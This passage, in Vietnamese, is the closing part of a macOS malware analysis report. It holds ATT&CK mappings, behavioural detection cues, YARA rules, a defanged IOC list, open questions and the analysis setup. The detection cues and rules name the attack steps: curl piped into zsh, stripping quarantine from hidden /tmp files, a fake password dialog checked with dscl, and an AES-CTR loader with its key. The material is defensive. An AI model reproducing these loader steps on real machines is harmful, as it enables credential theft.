| Initial Access (giai đoạn sau) | T1078 Valid Accounts · T1550.004 Web Session Cookie | Dùng phiên Facebook của nạn nhân |
| Resource Development (giai đoạn sau) | T1586.001 Compromise Accounts: Social Media | Đăng hoặc gửi lừa đảo crypto mạo danh MrBeast |

## 9. Phát hiện & săn tìm

### 9.1 Hành vi (EDR / ES framework / Unified Log)
- Tiến trình `zsh` hoặc `bash` có **stdin từ `curl`** (`curl … | zsh`).
- `xattr -c` (hoặc `-d com.apple.quarantine`) trên file trong `/tmp`, đặc biệt là file ẩn (`/tmp/.*`).
- Một binary trong `/tmp` được thực thi ngay sau `chmod +x`.
- `osascript` với `display dialog … hidden answer`, theo sau là `dscl . authonly`.
- Binary chưa ký Developer ID (self-signed) chạy `osascript -l JavaScript` và quét hàng loạt `system_profiler -nospawn -xml SP*DataType -detailLevel full` trong vài giây.
- App có `LSUIElement=true` mới tải về, mở kết nối tới `cdn.jsdelivr.net/gh/*` ngay khi khởi chạy.
- `openssl enc -d -aes-128-ctr` chạy trong một pipeline với `xxd -r -p` và `gunzip`.

### 9.2 YARA (heuristic, **chưa kiểm thử** trên tập mẫu sạch)
```yara
rule MacOS_Wan_GoDropper {
  meta: description = "Go dropper com.yard.wan fetching jsDelivr GitHub stage"  date = "2026-10-15"
  strings:
    $id   = "com.yard.wan" ascii
    $url  = "cdn.jsdelivr.net/gh/puppygirl7cutie" ascii
    $f1   = "main.pullCute" ascii
    $f2   = "main.checkGate" ascii
    $f3   = "main.dropCute" ascii
  condition:
    (uint32(0) == 0xbebafeca or uint32(0) == 0xfeedfacf) and ($url or ($id and 2 of ($f*)))
}

rule MacOS_ZshLoader_AESCTR_Md5Key {
  meta: description = "zsh loader: octal-encoded tools, AES-128-CTR zero IV, gunzip, eval"  date = "2026-10-15"
  strings:
    $a = "enc -d -aes-128-ctr -K" ascii
    $b = "-iv 00000000000000000000000000000000" ascii
    $c = "printf '\\155\\144\\065'" ascii        // md5
    $d = "printf '\\157\\160\\145\\156\\163\\163\\154'" ascii  // openssl
    $e = "eval \"$_r\"" ascii
  condition:
    filesize < 64KB and $a and $b and 2 of ($c, $d, $e)
}

rule MacOS_ZshLoader_Cid9mtl_Stage {
  meta: description = "decrypted stage-3: hidden /tmp drop + quarantine strip"  date = "2026-10-15"
  strings:
    $p1 = "\\057\\164\\155\\160\\057\\056\\143\\151\\144\\071\\155\\164\\154" ascii  // /tmp/.cid9mtl
    $p2 = "\\170\\141\\164\\164\\162" ascii   // xattr
    $p3 = "metrics/run?event=" ascii
    $p4 = "BuildID:" ascii
  condition:
    filesize < 32KB and $p1 and 2 of ($p2, $p3, $p4)
}
```

### 9.3 Web / landing page
- Domain tuổi dưới 7 ngày, root trả 404 hoặc trống, nhưng đường dẫn sâu có tham số affiliate (`?ref=`) lại phục vụ trang tải phần mềm.
- Quét URL cần dùng **đúng URL đầy đủ** từ quảng cáo, kèm User-Agent macOS và referrer Google.

### 9.4 Mạng
- DNS hoặc SNI tới `chantcompass9.com`, `raster-87.com`, `cleanerappmac.com`, `deepteks.com`.
- HTTP POST tới `/api/metrics/run?event=` có header `user:` và `BuildID:`.
- GET `cdn.jsdelivr.net/gh/puppygirl7cutie/*`.

## 10. IOC

```
# Domain / URL
cleanerappmac[.]com
hxxps://cleanerappmac[.]com/appscleaner/?ref=4770fc3bbab0
deepteks[.]com
hxxps://deepteks[.]com/gdfgsdgs/Installer.dmg
cdn.jsdelivr[.]net/gh/puppygirl7cutie/wan2/wan.cute
github[.]com/puppygirl7cutie/wan2
chantcompass9[.]com
hxxps://chantcompass9[.]com/curl/d05l1zuhe6za/o3361gf1ldpasopujs81ui.dat
hxxps://chantcompass9[.]com/f/a6b64pfdhh2yuqnqrmhhww/dpoxptoi
raster-87[.]com
hxxps://raster-87[.]com/api/metrics/run?event=pasted
hxxps://raster-87[.]com/api/metrics/run?event=stager

# SHA-256
320c777f39a64138a76966ce01557ede0fd5e8fec82c6495c4d020fe1dd94204  Installer.dmg
8df733ce1f313241964d655f7afc1978d470f7b3e08f603f5212199001798a0e  stage4.bin (/tmp/.cid9mtl)
# MD5 896bf5b2d446346e11719064750035e4 · SHA-1 4b5988352f0dba97800ee9496f372b999ab1022b

# Host
/tmp/.cid9mtl
/tmp/.cid9mtl.<pid>
Installer.app  (CFBundleIdentifier com.yard.wan, CFBundleName Wan)
org.slack.notifier  (code-signing identifier của stage4.bin)

# Code signing
Developer ID Application: URAZ SESTMER (YXSRL98558)

# HTTP header
user: AgJDLYqVfXWWVlhYveHxZRzaKYO8mKcM7kqNa_R8N1cHRmNd46fi
BuildID: AgLzbA1qGBEcmxGAk9qtrq1KJZ4mn33xSj73Nwn8uxFZfoz9626G
user: AgI3k34rsGWcGvemRFTBjF4UuDKSo6fYZaUH8Zhsp2qaM1plFJ4v
BuildID: AgIj6gSPZd-rIMOgd1tyaL6A-zZHkxl345lBoVxQ-OO54xYlSnT5

# Loader
AES-128-CTR key 2fea0f810969c4c811b998346bb4026f (md5("196549")), IV 0
```

## 11. Giới hạn & câu hỏi mở

- **Chưa thực thi mẫu.** Toàn bộ phân tích là tĩnh. Hành vi đánh cắp dữ liệu là suy luận dựa trên phân loại của ESET và đặc điểm họ AMOS.
- **Chưa giải mã được blob 404 KB của L4.** Thuật toán (ứng viên `fcn.1000322c0`), khoá (ứng viên hằng 300 B tại `0x10002a770`) và cơ chế thực thi payload vẫn chưa được xác định.
- **Chưa dịch ngược đầy đủ L1 (Wan).** Chưa xác minh điều kiện `checkGate`, cơ chế persistence (`keep`, `supportDir`) và cách thực thi `wan.cute`.
- Chưa có SHA-256 của binary `Wan` và của file `.dat` (L3).
- Chưa kiểm tra slice x86_64 của L4 (chuỗi `_system`).
- Chưa thu thập chuỗi click quảng cáo (URL `googleadservices`/`gclid`, tên nhà quảng cáo) từ máy nạn nhân. Nội dung landing page chưa được lưu (HTML, screenshot). Các tiêu chí cloaking (UA, IP, referrer) chưa được kiểm thử.
- **Máy nạn nhân:**
  1. **Đã reset (cài lại).** Mã độc không còn trên máy, nhưng cũng không còn dấu vết để kiểm tra (persistence, file bị lấy, log).
  2. **Hậu quả đã xác nhận:** tài khoản Facebook bị dùng để phát tán ảnh lừa đảo crypto mạo danh MrBeast (`ledgewin[.]com`). Phạm vi dữ liệu bị lấy ngoài Facebook chưa rõ.
  3. **Chưa rõ máy chủ C2 thật** nhận dữ liệu bị đánh cắp. `raster-87[.]com` chỉ nhận beacon từ L3; địa chỉ C2 của L4 nằm trong phần dữ liệu đã mã hoá.
  - Mốc thời gian do người dùng báo lại.

**Hướng tiếp theo đề xuất:**
- Phân tích động trong VM macOS cô lập (không Apple ID, snapshot, mạng giám sát). Đặt breakpoint `lldb` tại `__clear_cache` hoặc khi `entry.init0` trả về để dump payload.
- Hoặc mô phỏng `entry.init0` bằng Unicorn hoặc Qiling.
- Sandbox VirusTotal đã chạy nhưng không lộ C2 (mục 7.8). Cần sandbox giống máy thật (bare-metal) mới có khả năng vượt kiểm tra máy ảo.

## 12. Môi trường phân tích

- **Host:** macOS (Apple Silicon). Chỉ mount DMG ở chế độ `-readonly -nobrowse -noautoopen`. Không thực thi bất kỳ file nào.
- **VM:** Ubuntu Server 26.04.1 ARM64 trên UTM (QEMU). Không chia sẻ thư mục. Truy cập qua SSH với `-a -x -o PubkeyAuthentication=no`. Mạng đi qua Cloudflare WARP trên host.
- **Công cụ:** `curl`, `file`, `strings`, `xxd`, `openssl`, Python 3 (`-I`), radare2 6.0.7, `rabin2`.
- L2 và L3 được tải về dưới dạng text và giải mã thủ công. **Không dùng `eval`, `source` hay pipe vào shell.**
